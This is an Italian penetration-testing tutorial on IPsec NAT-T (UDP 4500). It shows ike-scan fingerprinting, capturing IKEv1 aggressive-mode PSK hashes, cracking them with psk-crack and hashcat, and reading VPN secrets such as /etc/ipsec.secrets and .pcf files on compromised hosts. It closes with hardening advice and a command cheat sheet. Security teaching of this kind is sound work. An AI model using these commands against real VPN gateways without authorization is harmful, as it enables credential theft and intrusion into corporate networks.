---
title: 'Porta 4500 IPsec NAT-T: VPN, IKE e PSK Cracking'
slug: porta-4500-ipsec-nat-t
description: 'Porta 4500 IPsec NAT-T nel pentest: IKE, NAT traversal, aggressive mode, PSK cracking e analisi della superficie VPN esposta.'
image: /porta-4500-ipsec-nat-t.webp
draft: true
date: 2026-04-14T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - IPsec NAT-T
  - IKEv1 Aggressive Mode
  - VPN PSK
---

La porta 4500 UDP è usata da IPsec NAT-Traversal (NAT-T), il meccanismo che permette ai tunnel VPN IPsec di funzionare attraverso dispositivi NAT. Quando un client VPN si trova dietro un router con NAT, il protocollo IKE sulla [porta 500](https://hackita.it/articoli/porta-500-isakmp) negozia la connessione e poi il traffico ESP viene incapsulato in UDP sulla porta 4500 per attraversare il NAT. Nel penetration testing, trovare la 4500 aperta conferma la presenza di un concentratore VPN IPsec — il punto di ingresso nella rete corporate. Il valore non è attaccare IPsec in sé (crittograficamente robusto se configurato bene), ma cercare misconfiguration: IKE aggressive mode che espone hash PSK crackabili, Pre-Shared Key deboli e credenziali VPN bruteforcabili.

La porta 4500 lavora sempre in coppia con la 500 (IKE). Se trovi la 4500, scansiona anche la 500 — lì avviene la negoziazione che puoi attaccare.

## Come Funziona IPsec NAT-T

```
Client VPN (dietro NAT)            Concentratore VPN
┌──────────────┐                   ┌──────────────────┐
│ 192.168.1.5  │                   │ VPN Gateway      │
│              │                   │ 203.0.113.10     │
│ IKE (:500)   │ ── negotiate ──► │ IKE (:500)       │
│ NAT-T (:4500)│ ── ESP in UDP ──►│ NAT-T (:4500)    │
│              │ ◄── tunnel ──────│ Rete interna:    │
│              │   10.10.0.0/16   │ 10.10.0.0/16     │
└──────────────┘                   └──────────────────┘
```

Senza NAT-T, il protocollo ESP non può attraversare il NAT perché non ha porte TCP/UDP. NAT-T incapsula ESP dentro pacchetti UDP sulla porta 4500.

## 1. Enumerazione

### Nmap

```bash
nmap -sU -p 500,4500 10.10.10.40
```

```
PORT     STATE SERVICE
500/udp  open  isakmp
4500/udp open  ipsec-nat-t
```

### ike-scan — Fingerprinting del concentratore

```bash
ike-scan -M 10.10.10.40
```

```
10.10.10.40     Main Mode Handshake returned
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
    VID=1f07f70eaa6514d3b0fa96542a500407 (Cisco Unity)
```

**Intelligence:** Auth=PSK (crackabile), 3DES (debole), Cisco Unity (è un ASA), Group 2 (DH 1024-bit, debole).

### ike-scan aggressive mode — Cattura hash PSK

```bash
ike-scan -M --aggressive -P handshake.txt 10.10.10.40
```

**Aggressive mode** invia l'hash della Pre-Shared Key nel primo pacchetto — intercettabile e crackabile offline.

### Identificare il vendor

```bash
ike-scan -M --showbackoff 10.10.10.40
```

Il pattern di backoff identifica: Cisco, Juniper, Fortinet, StrongSwan.

## 2. PSK Cracking

Se il concentratore supporta aggressive mode, l'hash catturato è crackabile.

```bash
# psk-crack (ike-scan suite)
psk-crack -d /usr/share/wordlists/rockyou.txt handshake.txt
```

```
Key "VPN_Corp2025!" matches handshake
```

```bash
# hashcat mode 5300 (IKEv1 aggressive mode PSK)
hashcat -m 5300 handshake.hash /usr/share/wordlists/rockyou.txt
```

PSK trovata → puoi connetterti alla VPN.

## 3. Credenziali VPN da Altre Fonti

Molti concentratori VPN richiedono anche credenziali utente (XAUTH) oltre alla PSK:

```bash
# Cerca file di configurazione VPN su host compromessi
find / -name "*.pcf" -o -name "*.ovpn" -o -name "ipsec.secrets" 2>/dev/null
```

```bash
# ipsec.secrets contiene le PSK in chiaro
cat /etc/ipsec.secrets
```

```
10.10.10.40 : PSK "VPN_Corp2025!"
```

```bash
# File .pcf (Cisco VPN client) — password offuscata ma decifrabile
cat vpn_profile.pcf | grep enc_GroupPwd
# Decodifica con cisco-decrypt
```

Le credenziali VPN spesso coincidono con quelle di [Active Directory](https://hackita.it/articoli/active-directory) (LDAP auth), o si trovano in [repository SVN](https://hackita.it/articoli/porta-3690-svn)/Git, [share NFS](https://hackita.it/articoli/porta-2049-nfs), [dump database](https://hackita.it/articoli/porta-3306-mysql) o email di [phishing](https://hackita.it/articoli/phishing).

## 4. Dentro la VPN — Post-Connection

```bash
# Connessione con StrongSwan
ipsec up corp-vpn

# Verifica subnet assegnata
ip addr show
ip route
```

Ora sei nella rete interna. Target prioritari: [Domain Controller](https://hackita.it/articoli/dcsync), [RDP](https://hackita.it/articoli/porta-3389-rdp), [SMB](https://hackita.it/articoli/smb), [MySQL](https://hackita.it/articoli/porta-3306-mysql).

```bash
nmap -sn 10.10.0.0/16
nmap -sV -p- 10.10.10.0/24
```

## 5. Detection & Hardening

* **Disabilita aggressive mode** — usa solo main mode (non espone hash PSK)
* **IKEv2** al posto di IKEv1 — più sicuro, niente aggressive mode
* **PSK forte** (20+ caratteri random) o meglio **certificati**
* **MFA per XAUTH** — non solo username/password
* **DH Group 14+ (2048-bit)** — non Group 2
* **AES-256** invece di 3DES
* **Monitora** tentativi VPN falliti (brute force indicator)

## 6. Cheat Sheet Finale

| Azione           | Comando                                            |
| ---------------- | -------------------------------------------------- |
| Nmap             | `nmap -sU -p 500,4500 target`                      |
| IKE fingerprint  | `ike-scan -M target`                               |
| Aggressive mode  | `ike-scan -M --aggressive -P handshake.txt target` |
| Vendor detect    | `ike-scan -M --showbackoff target`                 |
| PSK crack        | `psk-crack -d wordlist handshake.txt`              |
| Hashcat IKEv1    | `hashcat -m 5300 hash wordlist`                    |
| Cerca PSK        | `cat /etc/ipsec.secrets`                           |
| Cerca config VPN | `find / -name "*.pcf" -o -name "*.ovpn"`           |

***

Riferimento: RFC 3947 (NAT-T), ike-scan documentation, Cisco ASA security guides. Uso esclusivo in ambienti autorizzati.
[https://sendthepayload.com/fixing-ipsec-tunnels-with-nat-traversal-nat-t/](https://sendthepayload.com/fixing-ipsec-tunnels-with-nat-traversal-nat-t/)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
